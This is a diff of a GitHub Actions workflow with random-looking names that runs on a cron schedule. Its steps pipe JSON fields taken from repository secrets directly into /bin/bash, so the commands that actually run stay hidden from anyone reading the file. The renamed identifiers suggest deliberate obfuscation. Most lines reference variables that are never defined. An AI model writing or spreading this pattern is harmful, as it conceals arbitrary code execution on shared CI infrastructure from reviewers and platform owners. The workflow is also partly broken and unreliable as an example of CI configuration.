@@ -1,32 +1,32 @@
 name: gewangshui4637
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
-jobs:  # 19101
+    - cron: '11 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gewangshui4637
         env:
-          zsd4653: ${{ secrets.zsd4653 }}
+          vii4: ${{ secrets.vii4 }}
         run: |
-          echo $zsd4653 | jq -r .hmw6803 | /bin/bash
-          echo $lh1597 | jq -r .ad4368 | /bin/bash
-          echo $hl30704 | jq -r .yye12 | /bin/bash
-          echo $v07 | jq -r .qpsiu6607 | /bin/bash
-          echo $oqhsc96 | jq -r .tbgnp627 | /bin/bash
-          echo $fqns382 | jq -r .kp71668 | /bin/bash
-          echo $prhia3 | jq -r .i25623 | /bin/bash
-          echo $rd9 | jq -r .y7807 | /bin/bash
-          echo $dqkja76 | jq -r .kg6 | /bin/bash
-          echo $vq6803 | jq -r .ir50836 | /bin/bash
-          echo $yl083 | jq -r .ve4163 | /bin/bash
-          echo $xe64 | jq -r .e0486 | /bin/bash
-          echo $r5 | jq -r .du1 | /bin/bash
-          echo $xhhae85313 | jq -r .bdajk81869 | /bin/bash
-          echo $nobns25 | jq -r .kmbs5351 | /bin/bash
-          echo $qskuk6222 | jq -r .t15 | /bin/bash
-          echo $mr7263 | jq -r .tegz615 | /bin/bash
+          echo $vii4 | jq -r .elnk204 | /bin/bash
+          echo $jxaxw18 | jq -r .ffev613 | /bin/bash
+          echo $u45935 | jq -r .qzmm13557 | /bin/bash
+          echo $lgh7130 | jq -r .dtcp444 | /bin/bash
+          echo $g29863 | jq -r .vvr39 | /bin/bash
+          echo $fcull991 | jq -r .jo51 | /bin/bash
+          echo $m970 | jq -r .viqga81869 | /bin/bash
+          echo $cmeh0804 | jq -r .vry49917 | /bin/bash
+          echo $jj47 | jq -r .vjykc084 | /bin/bash
+          echo $c60 | jq -r .f03471 | /bin/bash
+          echo $gv59541 | jq -r .q837 | /bin/bash
+          echo $bjg118 | jq -r .e27259 | /bin/bash
+          echo $f8 | jq -r .qjrr2290 | /bin/bash
+          echo $brtqo77331 | jq -r .eo248 | /bin/bash
 
